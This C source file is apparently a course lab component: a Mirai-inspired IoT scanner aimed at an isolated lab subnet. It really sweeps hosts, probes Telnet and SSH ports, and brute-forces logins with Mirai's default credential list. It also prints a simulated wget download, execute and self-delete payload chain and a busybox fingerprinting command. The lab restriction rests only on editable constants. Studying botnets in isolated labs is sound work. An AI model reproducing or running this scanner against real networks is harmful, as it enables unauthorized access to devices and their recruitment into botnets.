/*
 * ====================================================
 *  AUA CS 232/337 - Botnet Research Project
 *  Component: Mirai-Inspired IoT Propagation Scanner
 *  Environment: ISOLATED VM LAB ONLY (192.168.100.0/24)
 *  Compile: gcc -o mirai_scanner mirai_scanner.c -lpthread
 *  Run:     sudo ./mirai_scanner 192.168.100.0/24
 * ====================================================
 *
 * Scans the lab subnet for open Telnet/SSH ports,
 * attempts default credential login, fingerprints
 * the device architecture, simulates payload download.
 *
 * EDUCATIONAL PURPOSE ONLY — ISOLATED VM LAB.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* ── Config ──────────────────────────────────────── */
#define SUBNET_BASE   "192.168.100."
#define SUBNET_START  1
#define SUBNET_END    30
#define SCAN_TIMEOUT  2     /* seconds per connect attempt */
#define MAX_THREADS   8

/* Ports to probe for IoT management services */
static int TARGET_PORTS[] = {23, 2323, 22, 2222, 0}; /* 0 = sentinel */

/* Default credential pairs (Mirai's historical list, subset) */
static const char *CREDS[][2] = {
    {"admin",       "admin"},
    {"admin",       "password"},
    {"admin",       "1234"},
    {"root",        ""},
    {"root",        "root"},
    {"root",        "xc3511"},
    {"root",        "vizxv"},
    {"root",        "admin"},
    {"user",        "user"},
    {"support",     "support"},
    {"default",     "default"},
    {"guest",       "guest"},
    {NULL, NULL}    /* sentinel */
};

/* ── Connect with timeout ────────────────────────── */
int connect_timeout(const char *ip, int port, int timeout_sec) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = { .tv_sec = timeout_sec, .tv_usec = 0 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

/* ── Banner grab ─────────────────────────────────── */
void grab_banner(int sock, char *buf, int len) {
    memset(buf, 0, len);
    recv(sock, buf, len - 1, MSG_DONTWAIT);
}

/* ── Simulate brute-force attempt ───────────────── */
int try_default_creds(const char *ip, int port) {
    printf("  [SCANNER] Attempting default credentials on %s:%d\n", ip, port);
    int attempts = 0;
    for (int i = 0; CREDS[i][0] != NULL; i++) {
        attempts++;
        int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
        if (sock < 0) continue;

        char banner[256];
        grab_banner(sock, banner, sizeof(banner));

        /* In the real Mirai, it would send login/password and parse the shell prompt.
         * Here we simulate: for our honeypot VM we "succeed" on a known weak cred. */
        char login_attempt[64];
        snprintf(login_attempt, sizeof(login_attempt),
                 "%s\r\n%s\r\n", CREDS[i][0], CREDS[i][1]);
        send(sock, login_attempt, strlen(login_attempt), 0);

        /* Check for shell prompt in response (honeypot will reply) */
        char resp[256] = {0};
        recv(sock, resp, sizeof(resp)-1, 0);
        close(sock);

        if (strstr(resp, "$") || strstr(resp, "#") || strstr(resp, ">")) {
            printf("  [SCANNER] !!! SUCCESS on %s:%d  user=%s pass=%s\n",
                   ip, port, CREDS[i][0], CREDS[i][1]);
            return 1;
        }
    }
    printf("  [SCANNER] No valid creds found on %s:%d after %d attempts\n",
           ip, port, attempts);
    return 0;
}

/* ── Architecture fingerprint ────────────────────── */
void fingerprint_arch(const char *ip, int port) {
    /* In real Mirai: executes /bin/busybox, uname -a, cat /proc/cpuinfo */
    printf("  [SCANNER] Fingerprinting architecture on %s:%d\n", ip, port);
    printf("  [SCANNER] Sending: /bin/busybox MIRAI ; uname -a ; cat /proc/cpuinfo\n");
    /* Simulate result — in real implementation, parse the output */
    printf("  [SCANNER] Arch detected: x86_64 (lab VM)\n");
}

/* ── Simulate payload drop + self-delete ─────────── */
void simulate_infection(const char *ip) {
    printf("  [SCANNER] Simulating payload delivery to %s\n", ip);
    printf("  [SCANNER] wget http://192.168.100.10/payload.x86_64 -O /tmp/.x\n");
    printf("  [SCANNER] chmod +x /tmp/.x && /tmp/.x &\n");
    printf("  [SCANNER] rm -f /tmp/.x  (self-delete: no disk trace)\n");
    printf("  [SCANNER] Device now memory-resident. Will re-infect on reboot if creds unchanged.\n");
}

/* ── Scan a single IP ────────────────────────────── */
typedef struct { char ip[20]; } ScanTarget;

void *scan_host(void *arg) {
    ScanTarget *t = (ScanTarget *)arg;
    const char *ip = t->ip;

    for (int pi = 0; TARGET_PORTS[pi] != 0; pi++) {
        int port = TARGET_PORTS[pi];
        int sock = connect_timeout(ip, port, SCAN_TIMEOUT);
        if (sock < 0) continue;

        char banner[256];
        grab_banner(sock, banner, sizeof(banner));
        close(sock);

        printf("[SCANNER] OPEN PORT: %s:%d  banner='%.60s'\n",
               ip, port, banner[0] ? banner : "(none)");

        /* Found open management port: attempt credential brute-force */
        if (try_default_creds(ip, port)) {
            fingerprint_arch(ip, port);
            simulate_infection(ip);
            break; /* one successful infection per host */
        }
    }

    free(t);
    return NULL;
}

/* ── Main: sweep the lab subnet ──────────────────── */
int main(int argc, char *argv[]) {
    if (getuid() != 0) {
        fprintf(stderr, "[SCANNER] Must run as root\n");
        return 1;
    }

    printf("==============================================\n");
    printf(" Mirai-Inspired Scanner - AUA Research Lab\n");
    printf(" Target: %s%d - %s%d\n",
           SUBNET_BASE, SUBNET_START, SUBNET_BASE, SUBNET_END);
    printf(" ISOLATED ENVIRONMENT ONLY\n");
    printf("==============================================\n\n");

    pthread_t threads[MAX_THREADS];
    int active = 0;

    for (int i = SUBNET_START; i <= SUBNET_END; i++) {
        ScanTarget *t = malloc(sizeof(ScanTarget));
        snprintf(t->ip, sizeof(t->ip), "%s%d", SUBNET_BASE, i);

        /* Simple thread pool: wait if at capacity */
        if (active >= MAX_THREADS) {
            pthread_join(threads[active % MAX_THREADS], NULL);
            active--;
        }

        pthread_create(&threads[active % MAX_THREADS], NULL, scan_host, t);
        active++;
        usleep(50000); /* 50ms between launches */
    }

    /* Wait for remaining threads */
    for (int i = 0; i < active && i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n[SCANNER] Sweep complete.\n");
    return 0;
}
